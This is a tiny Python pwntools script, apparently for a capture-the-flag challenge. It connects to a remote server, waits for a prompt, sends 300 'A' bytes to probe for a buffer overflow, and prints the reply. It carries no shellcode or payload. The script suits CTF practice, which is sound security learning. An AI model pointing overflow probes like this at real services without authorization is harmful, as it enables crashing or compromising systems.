from pwn import *

buf = b"A"*300
p = remote("rvcechalls.xyz",24695)

p.recvuntil(b"?")

p.sendline(buf)
print("[+]Buffer Sent")
print(p.recvline())